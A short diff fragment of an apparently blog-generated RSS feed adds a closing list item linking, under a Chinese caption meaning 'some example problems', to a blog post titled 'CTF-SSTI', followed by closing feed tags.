+&lt;li>一些例题： &lt;a class="link" href="https://www.extrader.top/posts/47d18edd/" target="_blank" rel="noopener"
+>CTF-SSTI | Extraderの博客&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
